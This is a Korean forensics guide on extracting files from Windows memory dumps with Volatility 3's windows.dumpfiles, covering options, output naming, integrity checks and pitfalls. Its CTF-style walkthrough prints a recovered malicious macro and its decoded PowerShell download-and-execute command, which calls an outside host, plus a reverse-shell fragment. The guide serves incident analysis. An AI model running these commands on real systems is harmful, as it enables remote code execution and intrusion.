---
id: FOR-0221
title: "Volatility 3 windows.dumpfiles로 메모리에서 파일 추출하기"
slug: "dumpfiles"
category: "메모리"
type: "guide"
difficulty: "intermediate"
priority: "high"
platform: [windows, linux]
artifact: ["memory dump", "FILE_OBJECT", "CONTROL_AREA", "SharedCacheMap", "DataSectionObject", "ImageSectionObject"]
file_paths: ["mem.raw", "dump/file.0x0.0x0.DataSectionObject.name.dat"]
registry_paths: []
event_ids: []
protocols: []
tools: ["Volatility 3", "file", "strings", "sha256sum", "HxD", "grep"]
commands: ["python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --pid 4520", "python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --virtaddr 0xa50e9b3f2c40", "python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --physaddr 0x1f2c3d40", "python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --filter flag", "python3 vol.py -f mem.raw windows.filescan", "file dump/* && sha256sum dump/*"]
regex_patterns: []
wireshark_filters: []
tshark_fields: []
log_fields: ["Cache", "FileObject", "FileName", "Result", "File output"]
file_formats: ["raw", "vmem", "dmp", "dat", "img"]
primary_terms: ["dumpfiles", "메모리에서 파일 추출", "파일 객체 덤프"]
keywords: ["Volatility", "dumpfiles", "windows.dumpfiles", "메모리 파일 추출", "FILE_OBJECT", "DataSectionObject", "ImageSectionObject", "SharedCacheMap", "filescan", "virtaddr", "physaddr", "잘린 파일", "파일 객체 덤프"]
aliases: ["volatility dumpfiles", "메모리에서 파일 뽑기", "dumpfiles 사용법", "메모리 파일 추출", "filescan dumpfiles", "덤프에서 문서 추출"]
symptom_keywords: ["메모리에서 파일을 꺼내야 한다", "삭제된 파일이 메모리에 있나", "dumpfiles가 아무것도 안 뽑는다", "추출한 파일이 열리지 않는다", "덤프한 파일이 잘렸다", "첨부 문서를 복구해야 한다"]
related: ["FOR-0220", "FOR-0214", "FOR-0228"]
source_ids: ["SRC-006", "SRC-089"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

`windows.dumpfiles`는 메모리에 남은 `FILE_OBJECT`의 섹션 객체를 디스크로 되돌려 주는 플러그인이며, **캐시된 페이지만 존재하므로 결과물은 잘려 있을 수 있다** — 크기·헤더·푸터를 직접 검증하지 않은 추출물은 증거가 아니다.

## 어떤 문제에서 필요한가

- "메모리 덤프에서 공격자가 실행한 스크립트/문서를 복구하라"
- "디스크 이미지 없이 메모리만 주어졌는데 첨부 파일 내용을 구하라"
- "삭제된 파일의 내용이 남아 있는가"
- "악성 프로세스가 열고 있던 파일을 추출해 해시를 구하라"
- "flag가 들어 있는 텍스트 파일을 찾아라"

메모리는 **디스크에서 이미 지워진 파일의 마지막 사본**을 쥐고 있는 경우가 많다. 파일이 열렸다면 캐시 매니저가 그 내용을 물리 메모리에 올려 두었고, 파일이 지워져도 `FILE_OBJECT`와 캐시 페이지는 즉시 사라지지 않는다. 그 창을 노리는 것이 `dumpfiles`다.

## 문제에서 처음 볼 단서

1. 지문에 "첨부된 문서", "다운로드한 파일", "삭제된 스크립트"가 나오는데 **디스크 이미지가 없다**
2. `windows.cmdline`에서 파일 경로가 보이지만 그 파일 내용이 필요하다
3. `windows.filescan` 결과에 `.ps1`, `.docm`, `.zip`, `.txt`, `.exe`가 낯선 경로(`\Users\*\AppData\Local\Temp`)에 있다
4. `windows.handles --pid N`의 `File` 타입 항목에 조사 대상 파일이 걸려 있다

## 30초 절차

```bash
python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --pid 4520
```

```bash
# 0) 출력 폴더를 먼저 만든다. 없으면 플러그인이 실패한다.
mkdir -p dump

# 1) 이름으로 목표를 먼저 찾는다 (filescan은 느리므로 결과를 파일로 저장)
python3 vol.py -f mem.raw windows.filescan > filescan.txt
grep -iE '\.(ps1|docm|xlsm|zip|txt|exe|dll)$' filescan.txt | grep -iE 'temp|appdata|users|programdata'

# 2) 그 오프셋 하나만 추출
python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --virtaddr 0xa50e9b3f2c40

# 3) 검증 — 이 단계를 건너뛰면 안 된다
ls -la dump/ && file dump/* && sha256sum dump/*
```

`-o`는 플러그인 이름 **앞**에 오는 전역 옵션이다. `windows.dumpfiles -o dump/`처럼 뒤에 붙이면 인자 파싱에서 걸린다.

## 상세 절차

### 1단계 — 세 가지 지정 방식을 구분한다

| 방식 | 명령 | 무엇을 뽑는가 | 언제 쓰는가 |
| --- | --- | --- | --- |
| PID 지정 | `windows.dumpfiles --pid 4520` | 그 프로세스가 **열고 있던 파일 전부** + 프로세스 이미지·DLL 매핑 | 의심 프로세스를 통째로 훑을 때 |
| 가상 주소 | `windows.dumpfiles --virtaddr 0xa50e9b3f2c40` | `FILE_OBJECT` **하나** | `filescan`이 준 오프셋을 그대로 넘길 때 |
| 물리 주소 | `windows.dumpfiles --physaddr 0x1f2c3d40` | `FILE_OBJECT` **하나** | 물리 오프셋만 아는 경우 |
| 이름 패턴 | `windows.dumpfiles --filter flag` | 이름이 패턴에 맞는 파일 | 파일명 일부만 아는 경우 |

`--pid`를 주지 않으면 **덤프 전체의 모든 파일 객체**를 대상으로 삼는다. 수 GB 덤프에서 그렇게 돌리면 수천 개 파일이 쏟아지고 수십 분이 걸린다. **대회장에서는 반드시 범위를 좁힌다.**

```bash
# 프로세스가 열고 있던 파일 전부
python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --pid 4520

# 이름 패턴으로
python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --filter 'invoice'

# 오프셋 하나만 (가장 빠르고 정확하다)
python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --virtaddr 0xa50e9b3f2c40
```

`--filter`의 매칭 방식(부분 문자열인지 정규식인지, 대소문자 구분 여부)은 버전에 따라 차이가 있으므로 **먼저 짧은 부분 문자열로 시도**하고, 안 잡히면 `filescan` 결과에서 오프셋을 뽑아 `--virtaddr`로 우회한다.

### 2단계 — filescan → grep → dumpfiles 파이프라인

이것이 실전 순서다. `dumpfiles`를 무작정 돌리는 것이 아니라 **목표를 먼저 특정**한다.

```bash
# 1) 파일 객체 전수 스캔 (한 번만 돌리고 텍스트로 보관)
python3 vol.py -f mem.raw windows.filescan > filescan.txt
wc -l filescan.txt

# 2) 관심 확장자
grep -iE '\.(ps1|bat|vbs|js|hta|docm|xlsm|pdf|zip|7z|rar|txt|csv|exe|dll|log)' filescan.txt

# 3) 관심 경로 (사용자가 만든 것 / 임시 폴더)
grep -iE '\\\\Users\\\\|\\\\Temp\\\\|\\\\Downloads\\\\|\\\\ProgramData\\\\' filescan.txt

# 4) 이름 키워드
grep -iE 'flag|secret|password|invoice|payload|update|payment' filescan.txt

# 5) 나온 Offset을 --virtaddr로
python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --virtaddr 0xa50e9b3f2c40
```

`filescan`은 풀 태그 스캔이라 **닫힌 파일과 삭제된 파일의 객체까지** 잡아낸다. 그래서 이 파이프라인이 삭제 파일 복구 경로가 된다.

### 3단계 — 출력 파일명을 읽는다

`-o dump/`에 만들어지는 파일명은 다음 꼴이다.

```text
dump/file.0xa50e9b3f2c40.0xa50e9c112b00.DataSectionObject.invoice.docm.dat
dump/file.0xa50e9d221080.0xa50e9d33aa00.ImageSectionObject.svch0st.exe.img
dump/file.0xa50e9b3f2c40.0xa50e9c112b00.SharedCacheMap.invoice.docm.dat
```

| 조각 | 의미 |
| --- | --- |
| `file.` | 고정 접두사 |
| 첫 번째 `0x...` | `FILE_OBJECT`의 오프셋 — `filescan`/`handles`에서 본 그 값 |
| 두 번째 `0x...` | 섹션 객체(`CONTROL_AREA` 등)의 오프셋 |
| `DataSectionObject` / `ImageSectionObject` / `SharedCacheMap` | **어느 경로로 매핑된 내용인가** (아래 표) |
| 마지막 이름 | 원본 파일 이름 |
| 확장자 | 데이터 파일은 `.dat`, 실행 이미지는 `.img` |

**멤버 이름이 결과물의 성격을 결정한다.** 이것을 모르면 같은 파일이 왜 두세 개로 나오는지 이해할 수 없다.

| 멤버 | 무엇의 사본인가 | 읽는 법 |
| --- | --- | --- |
| `DataSectionObject` | 파일을 **데이터로** 매핑한 섹션. 문서·스크립트·로그의 실제 내용 | 문서/텍스트를 원하면 이것을 먼저 본다 |
| `ImageSectionObject` | 파일을 **실행 이미지로** 매핑한 섹션. exe/dll | PE 분석용. 디스크 원본과 바이트가 다를 수 있다 ([FOR-0228](./process-dump.html)) |
| `SharedCacheMap` | 캐시 매니저의 뷰(VACB). **최근 읽고 쓴 부분만** 담긴 경우가 많다 | 가장 잘 잘린다. 하지만 **가장 최신 내용**일 수 있다 |

같은 파일에 대해 `DataSectionObject`와 `SharedCacheMap`이 **둘 다** 나오면 둘 다 확인한다. 디스크에 flush되지 않은 마지막 편집 내용은 `SharedCacheMap` 쪽에만 있을 수 있다.

`SharedCacheMap` 결과물의 확장자 표기는 버전에 따라 다르게 나온 사례가 있으므로 **파일명을 눈으로 확인**한다. 판단은 확장자가 아니라 파일명 중간의 멤버 이름으로 한다.

### 4단계 — 추출물을 검증한다 (건너뛰면 안 되는 단계)

```bash
cd dump

# 1) 크기 — 0바이트면 실패, 4096의 배수로 딱 맞으면 페이지 단위로 채워진 것
ls -la

# 2) 시그니처 판정
file *

# 3) 헤더 육안 확인
xxd -l 64 file.0xa50e9b3f2c40.*.DataSectionObject.invoice.docm.dat

# 4) 푸터 확인 (ZIP 계열은 끝에 EOCD가 있어야 온전하다)
xxd -s -32 file.0xa50e9b3f2c40.*.DataSectionObject.invoice.docm.dat

# 5) 내용 확인
strings -n 6 file.*.dat | head -40

# 6) 해시 (제출용 / 대조용)
sha256sum *
```

| 형식 | 헤더 | 온전성 판정 근거 |
| --- | --- | --- |
| PE (exe/dll) | `4D 5A` (`MZ`) | `0x3C` 오프셋의 e_lfanew가 가리키는 곳에 `50 45 00 00`(`PE\0\0`) |
| ZIP / docx / xlsx / docm | `50 4B 03 04` | 파일 **끝**에 `50 4B 05 06`(EOCD)가 있어야 압축 해제된다 |
| PDF | `25 50 44 46` (`%PDF`) | 끝에 `%%EOF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | 끝에 `IEND` 청크 |
| JPEG | `FF D8 FF` | 끝에 `FF D9` |
| GZIP | `1F 8B` | — |
| 텍스트/스크립트 | 없음 | `strings`로 내용이 이어지는지 눈으로 확인 |

**헤더는 있는데 푸터가 없으면 잘린 것이다.** ZIP 계열(현대 Office 문서 포함)은 EOCD가 없으면 어떤 도구로도 정상 해제되지 않는다. 그때는 `strings`로 내용 조각만 건지거나, `SharedCacheMap` 쪽 사본을 다시 시도하거나, 카빙 전략으로 넘어간다 ([FOR-0045](./carving-strategy.html)).

### 5단계 — 잘린 파일에서 답을 건지는 법

```bash
# 1) 깨진 docx/xlsx라도 XML 조각은 읽힌다
strings -n 8 file.*.invoice.docm.dat | grep -iE 'flag|http|powershell|Sub |Shell'

# 2) UTF-16LE 문자열도 반드시 (Windows 문자열 다수가 UTF-16)
strings -el -n 8 file.*.dat | grep -iE 'flag|http'

# 3) 깨진 ZIP 강제 복구 시도
7z l file.*.dat
7z x -y file.*.dat -oextracted/

# 4) ZIP 헤더만 남았으면 내부 항목 이름은 보인다
xxd file.*.dat | grep -A2 'PK'
```

문서 매크로 문제에서는 **`vbaProject.bin`이 온전히 나오지 않아도** `strings`에 `Sub AutoOpen`, `Shell(`, `powershell -enc`가 그대로 걸리는 경우가 흔하다.

### 6단계 — 추출이 실패하는 흔한 원인

| 증상 | 원인 | 대응 |
| --- | --- | --- |
| `Result`에 `Error dumping file` / 아무 파일도 안 생김 | 해당 페이지가 물리 메모리에 없다(페이지아웃) | 다른 멤버(`SharedCacheMap`)를 시도, 또는 포기하고 `strings` 검색으로 |
| 0바이트 파일만 생김 | 섹션 객체는 있으나 캐시된 페이지가 0개 | 파일 내용은 메모리에 없다. 디스크 이미지가 필요하다 |
| 출력 폴더 관련 에러 | `-o` 경로가 없다 | `mkdir -p dump` 를 먼저 |
| 파일이 하나도 안 잡힘 | `--pid`가 틀렸거나 그 프로세스가 이미 종료됨 | `windows.psscan`으로 종료된 프로세스 확인 후 `filescan` 경로로 우회 |
| `--filter`가 안 먹음 | 매칭 규칙이 기대와 다름 | `filescan` + `grep` → `--virtaddr` |
| 심볼 오류로 플러그인 자체가 실패 | 커널 심볼(ISF) 없음 | 오프라인 심볼 배치 (아래 "막혔을 때") |

## 출력 필드 해석

`windows.dumpfiles`의 화면 출력은 짧다. **실제 결과물은 `-o` 폴더에 있다.**

| 컬럼 | 의미 | 읽는 법 |
| --- | --- | --- |
| `Cache` | 어느 섹션에서 뽑았는가 (`DataSectionObject` / `ImageSectionObject` / `SharedCacheMap`) | 결과물의 성격 판정 근거 |
| `FileObject` | `FILE_OBJECT` 오프셋 | `filescan`·`handles` 출력과 같은 값 — 대조에 쓴다 |
| `FileName` | 원본 파일 이름 | 경로가 아니라 이름만 나오는 경우가 있다 |
| `Result` | 저장된 파일명 또는 에러 메시지 | 여기가 에러면 그 파일은 안 나왔다 |

컬럼 이름은 버전에 따라 `File output` 등으로 표기가 다를 수 있다. **판단은 `-o` 폴더의 `ls -la` 결과로 한다.**

타임스탬프는 이 플러그인이 출력하지 않는다. 파일의 시각 정보가 필요하면 `windows.filescan`으로 얻은 오프셋을 들고 `$MFT`([FOR-0021](./mft-basics.html))로 넘어가거나, `windows.info`의 `SystemTime`(**UTC**)을 기준점으로 삼아 다른 artifact와 맞춘다. Volatility 3의 모든 시각 출력은 UTC이므로 KST 답이 필요하면 **+9시간**한다.

## pivot: 다음에 볼 artifact

| dumpfiles에서 얻은 것 | 다음에 볼 것 | 확인할 것 |
| --- | --- | --- |
| 추출한 exe/dll | `sha256sum` → 오프라인 해시 DB / yara | 알려진 악성코드인지 |
| 추출한 exe | `windows.malfind --pid N` | 같은 코드가 인젝션되었는지 |
| 추출한 `.ps1` / `.bat` | 스크립트 내용의 URL·IP | pcap의 `ip.addr == <IP>` ([FOR-0146](./wireshark-30sec-triage.html)) |
| 추출한 문서의 매크로 문자열 | `windows.cmdline` | 실제로 실행된 명령행과 일치하는지 |
| `FileObject` 오프셋 | `windows.handles --pid N` | 어느 프로세스가 그 파일을 열고 있었나 |
| 파일 이름/경로 | `$MFT`, `$UsnJrnl`, `$Recycle.Bin` | 생성·삭제 시각 |
| 잘려서 못 쓴 파일 | `windows.memmap --dump` + 카빙 | 프로세스 주소공간에서 직접 카빙 |
| 파일이 메모리에 없음 | `strings mem.raw` 직접 검색 | 내용 일부라도 남았는지 |

## 흔한 함정

- **검증 없이 추출물을 정답으로 제출하는 것.** 캐시된 페이지만 모은 결과라 중간이 0으로 채워지거나 뒤가 잘려 있다. → `file`, 헤더, 푸터, `strings`를 반드시 확인한다.
- **`--pid` 없이 전체를 돌리는 것.** 수천 개 파일과 수십 분이 소요된다. → `filescan` + `grep`으로 목표를 먼저 특정하고 `--virtaddr`로 하나만 뽑는다.
- **`-o`를 플러그인 이름 뒤에 두는 것.** `-o`는 전역 옵션이다. → `vol.py -f mem.raw -o dump/ windows.dumpfiles ...` 순서를 지킨다.
- **출력 폴더를 만들지 않는 것.** 존재하지 않는 경로면 저장 단계에서 실패한다. → `mkdir -p dump`.
- **같은 파일의 여러 결과물 중 하나만 보는 것.** `DataSectionObject`와 `SharedCacheMap`의 내용이 다르다. → 둘 다 열어 보고, **디스크에 flush되지 않은 최신 내용은 `SharedCacheMap` 쪽**이라는 것을 기억한다.
- **추출한 PE의 해시로 VirusTotal/해시 DB를 대조하려는 것.** 메모리 이미지는 재배치·IAT 해석 때문에 디스크 원본과 해시가 다르다. → 해시 대조는 `DataSectionObject` 사본으로 시도하고, 그래도 다르면 문자열·yara로 판정한다 ([FOR-0228](./process-dump.html)).
- **0바이트 결과를 도구 오류로 보는 것.** 섹션 객체만 남고 페이지가 회수된 정상 상태다. → 그 파일 내용은 메모리에 없다고 결론 내리고 다른 경로를 찾는다.
- **`filescan`에 파일이 있으니 내용도 있다고 가정하는 것.** `filescan`은 **객체**를 찾는다. 내용의 존재는 별개다.
- **확장자로 형식을 믿는 것.** 추출물의 이름은 원본 이름을 그대로 따르므로 위조된 확장자도 그대로 따라온다. → `file`과 헤더로 판정한다 ([FOR-0036](./signature-extension-mismatch.html)).
- **Volatility 2 문법을 쓰는 것.** Vol2의 `dumpfiles -Q <offset> -D dir/`은 Vol3에서 동작하지 않는다. Vol3는 `--virtaddr`/`--physaddr`와 전역 `-o`를 쓴다.
- **심볼 준비를 안 한 상태로 대회장에 들어가는 것.** 모든 플러그인이 동시에 죽는다.

## 교차검증

```bash
# 1) 파일 객체가 실제로 존재하는지 (닫힌/삭제된 파일 포함)
python3 vol.py -f mem.raw windows.filescan | grep -i invoice

# 2) 어느 프로세스가 그 파일을 열고 있었는지
python3 vol.py -f mem.raw windows.handles --pid 4520 | grep -i invoice

# 3) 추출
mkdir -p dump
python3 vol.py -f mem.raw -o dump/ windows.dumpfiles --virtaddr 0xa50e9b3f2c40

# 4) 파서를 우회한 확인 — 같은 문자열이 덤프 원본에도 있는가
strings -n 8 mem.raw | grep -i 'invoice.docm' | head
strings -el -n 8 mem.raw | grep -i 'invoice.docm' | head

# 5) 형식/온전성
file dump/* ; xxd -l 32 dump/*.dat ; xxd -s -32 dump/*.dat

# 6) 디스크 artifact가 있다면 $MFT / $UsnJrnl 의 생성·삭제 시각과 대조
```

3)의 결과물이 4)의 문자열을 포함하지 않으면 잘못된 오프셋을 뽑았거나 추출이 잘렸다는 뜻이다.

## mini walkthrough

```text
문제:
"피싱 메일 첨부를 열어 감염된 PC의 메모리 덤프다.
 첨부 문서에 들어 있던 매크로가 다운로드한 URL을 구하라."
첨부: infected.raw (2.0 GB)

1. python3 vol.py -f infected.raw windows.info
   -> NTBuildLab 19041.1 / Is64Bit True / SystemTime 2026-03-14 07:41:03 (UTC)
   정상 인식.

2. 첫 시도 (실패한 접근):
   "문서를 뽑으면 된다" 라고 생각해 프로세스 지정 없이 전체를 돌렸다.

   mkdir -p dump
   python3 vol.py -f infected.raw -o dump/ windows.dumpfiles

   -> 14분이 지나도 끝나지 않고 dump/ 에 3,000개가 넘는 파일이 쌓였다.
      대부분 폰트, 아이콘, 시스템 DLL 이었다.
      ls dump/ | wc -l  ->  3271
   왜 틀렸나: dumpfiles 는 "무엇을" 뽑을지 정해 주지 않으면
   덤프의 모든 파일 객체를 시도한다. 목표를 먼저 특정해야 한다.
   Ctrl+C 로 중단.

3. 접근 변경 — filescan 으로 목표를 먼저 찾는다
   python3 vol.py -f infected.raw windows.filescan > filescan.txt
   grep -iE '\.(docm|xlsm|ps1)' filescan.txt

   0xa50e9b3f2c40  \Users\jhkim\AppData\Local\Temp\invoice_0314.docm
   0xa50e9c8a1180  \Users\jhkim\AppData\Local\Temp\a.ps1

4. 오프셋 하나만 추출
   python3 vol.py -f infected.raw -o dump/ windows.dumpfiles --virtaddr 0xa50e9b3f2c40

   Cache               FileObject      FileName          Result
   DataSectionObject   0xa50e9b3f2c40  invoice_0314.docm file.0xa50e9b3f2c40.0xa50e9c112b00.DataSectionObject.invoice_0314.docm.dat
   SharedCacheMap      0xa50e9b3f2c40  invoice_0314.docm file.0xa50e9b3f2c40.0xa50e9c112b00.SharedCacheMap.invoice_0314.docm.dat

5. 두 번째 실패 — 검증을 건너뛰고 열려고 했다
   unzip dump/file.*.DataSectionObject.invoice_0314.docm.dat
   -> End-of-central-directory signature not found

   ls -la dump/
   -> 45056 바이트 (= 11 * 4096). 원본은 이보다 컸을 것이다.
   xxd -l 16  dump/file.*.DataSectionObject.*.dat
   -> 50 4b 03 04 ...   (PK.. 헤더는 정상)
   xxd -s -32 dump/file.*.DataSectionObject.*.dat
   -> 00 00 00 00 ...   (EOCD 없음 -> 뒤가 잘렸다)

   교훈: 헤더만 보고 온전하다고 판단하면 안 된다. 푸터까지 본다.

6. 잘린 파일에서 내용 건지기
   strings -n 8 dump/file.*.DataSectionObject.invoice_0314.docm.dat | grep -iE 'sub |shell|http|powershell'
   -> Sub AutoOpen
   -> Shell("powershell -nop -w hidden -enc SQBFAFgAIAAo..."), 0

   strings -el -n 8 dump/file.*.SharedCacheMap.invoice_0314.docm.dat | grep -i http
   -> (없음)

7. EncodedCommand 디코딩
   python3 -c "import base64;print(base64.b64decode('SQBFAFgAIAAo...').decode('utf-16-le'))"
   -> IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a.ps1')

8. 확증 — 다운로드된 스크립트도 메모리에 있었다
   python3 vol.py -f infected.raw -o dump/ windows.dumpfiles --virtaddr 0xa50e9c8a1180
   strings dump/file.*.a.ps1.dat | head
   -> $c='198.51.100.5';$p=4444; ...

9. 확증 — cmdline 과 일치하는가
   python3 vol.py -f infected.raw windows.cmdline --pid 4288
   -> powershell.exe -nop -w hidden -enc SQBFAFgAIAAo...
   문서에서 뽑은 문자열과 동일. 확정.

정답: http://198.51.100.5/a.ps1
```

2단계와 5단계가 이 글의 요지다. **범위를 좁히지 않으면 끝나지 않고, 검증하지 않으면 잘린 파일을 정답으로 착각한다.** 잘린 ZIP도 `strings`로는 답을 준다.

## 막혔을 때 다음 체크

1. `mkdir -p dump`를 했는가 — 출력 폴더가 없으면 저장이 실패한다
2. `-o`가 플러그인 이름 **앞**에 있는가
3. `windows.info`가 성공하는가 — 실패하면 심볼/형식 문제이며 모든 플러그인이 죽는다
4. **오프라인 심볼이 준비되어 있는가** — `volatility3/symbols/windows.zip` 배치 또는 `--symbol-dirs <경로>`. 대회장은 온라인 심볼 다운로드가 안 된다
5. `--pid`로 범위를 좁혔는가, 아니면 `--virtaddr` 하나로 특정했는가
6. `windows.filescan` 결과를 텍스트로 저장해 두고 `grep`했는가
7. `--filter`가 안 먹으면 `filescan` → 오프셋 → `--virtaddr`로 우회했는가
8. 결과물 크기가 0바이트인가 — 그렇다면 내용은 메모리에 없다
9. `DataSectionObject`와 `SharedCacheMap` 사본을 **둘 다** 확인했는가
10. 헤더와 **푸터**를 모두 확인했는가 (ZIP은 EOCD, PDF는 `%%EOF`)
11. `strings`를 UTF-8과 `-el`(UTF-16LE) **양쪽으로** 돌렸는가
12. 종료된 프로세스라면 `windows.psscan`으로 확인 후 `filescan` 경로로 갔는가
13. 그래도 안 되면 `windows.memmap --pid N --dump`로 주소공간을 통째로 뽑아 카빙했는가
14. 최후 수단으로 `strings mem.raw | grep`을 돌렸는가

## 출처

- SRC-006 — Volatility 3 documentation: `windows.dumpfiles`의 `--pid` / `--virtaddr` / `--physaddr` / `--filter` 옵션, 전역 `-o` 출력 경로, `windows.filescan`·`windows.handles`·`windows.memmap` 연계
- SRC-089 — Wikipedia, List of file signatures: 추출물 검증에 쓴 헤더·푸터 매직 바이트(`MZ`, `PK\x03\x04`, `PK\x05\x06`, `%PDF`/`%%EOF`, PNG `IEND`, JPEG `FF D9`, GZIP `1F 8B`)
- 출력 컬럼 이름과 `SharedCacheMap` 결과물의 확장자 표기는 Volatility 3 버전에 따라 다를 수 있다. 실제 화면과 `-o` 폴더의 `ls -la`로 확인하고, 옵션이 의심되면 `vol windows.dumpfiles -h`로 그 버전의 정확한 플래그를 확인할 것
- `--filter`의 매칭 규칙(부분 문자열/정규식, 대소문자)은 버전차가 있으므로 단정하지 않았다. `vol windows.dumpfiles -h`로 확인할 것
